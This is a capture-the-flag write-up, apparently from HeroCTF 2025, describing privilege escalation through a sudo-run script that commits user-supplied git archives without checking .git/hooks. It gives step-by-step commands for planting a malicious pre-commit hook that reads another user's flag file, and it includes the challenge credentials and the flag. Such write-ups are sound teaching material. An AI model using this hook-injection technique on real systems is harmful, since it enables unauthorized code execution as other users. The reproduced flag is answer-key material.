misc
## 1. Initial Access

We started with the provided SSH credentials:

- **User:** `intern`
    
- **Password:** `fairy`
    

Bash

```
ssh intern@<TARGET_IP>
```

## 2. Enumeration

Upon logging in, standard enumeration revealed our escalation vector. Checking `sudo` privileges is always the first step:

Bash

```
intern@neverland:~$ sudo -l
User intern may run the following commands on neverland:
    (peter) /opt/commit.sh
```

We found we could execute `/opt/commit.sh` as the user **peter** without a password.

## 3. Vulnerability Analysis

We analyzed the source code of the script: `cat /opt/commit.sh`.

**The Workflow:**

1. The script takes a `.tar.gz` archive as input.
    
2. It extracts the archive to a temporary directory.
    
3. **Security Check 1:** It compares the `git log` history of the submitted repo against the official `/app` repo.
    
4. **Security Check 2:** It compares the hash of `.git/config` against the official repo to prevent config tampering.
    
5. **The Trigger:** If checks pass, it runs `git add .` followed by `git commit`.
    

**The Flaw:** While the script validates the history and the config file, **it does not validate the `.git/hooks/` directory.**

In Git, hooks are scripts that run automatically before or after Git events. Specifically, a **`pre-commit`** hook runs the moment `git commit` is executed. Since the script runs `git commit` as user **peter**, any code inside the `pre-commit` hook will also execute as **peter**.

## 4. Exploitation

We devised a "Supply Chain" attack by creating a repository that looks legitimate but contains a malicious hook.

### Step 1: Clone the Valid State

To bypass the security checks, we started by copying the valid repository.

Bash

```
cp -r /app /tmp/exploit
cd /tmp/exploit
```

### Step 2: Inject the Malicious Hook

We created a `pre-commit` script. Since we can't see the output of the hook easily, we directed it to read the flag and write it to a world-readable file in `/tmp`.

Bash

```
# Create the hook
echo '#!/bin/bash' > .git/hooks/pre-commit
echo 'cat /home/peter/flag.txt > /tmp/flag_pwned' >> .git/hooks/pre-commit
echo 'chmod 777 /tmp/flag_pwned' >> .git/hooks/pre-commit

# IMPORTANT: Make it executable
chmod +x .git/hooks/pre-commit
```

### Step 3: Force a Commit

Git hooks only fire if a commit actually happens. If there are no changes, `git commit` exits early. We created a dummy file to force a state change.

Bash

```
echo "trigger" > update.txt
```

### Step 4: Package and Execute

We packaged the malicious repository and fed it to the vulnerable script using `sudo`.

Bash

```
cd /tmp
tar -czf payload.tar.gz exploit
sudo -u peter /opt/commit.sh /tmp/payload.tar.gz
```

The script output confirmed `Changes successfully committed`, indicating our hook fired.

## 5. Loot

We checked the temporary file created by our payload:

Bash

```
cat /tmp/flag_pwned
```

**Flag:** `Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}`

[[HeroCTF 2025]]
